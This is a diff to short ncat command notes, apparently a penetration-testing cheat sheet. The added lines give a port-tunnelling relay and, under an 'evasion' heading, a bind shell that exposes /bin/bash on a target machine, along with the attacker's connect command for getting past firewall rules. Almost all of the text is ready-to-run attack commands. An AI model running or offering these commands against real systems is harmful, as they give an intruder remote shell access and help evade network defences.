@@ -1,2 +1,11 @@
 Listening : ncat -lvnp PORT_NUMBER
 Connecting : ncat IP_ADDRSS PORT_NUMBER
+
+Port Tunneling Using ncat :
+        ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
+
+Evasion Using Non-Standard Ports :
+if the firewall is not blocking connections to a destination port 
+==> ncat -lvnp PORT_NUMBER -e /bin/bash ( on the target machine )
+==> ncat TARGET_MACHINE PORT_NUMBER ( on the attack machine )
+
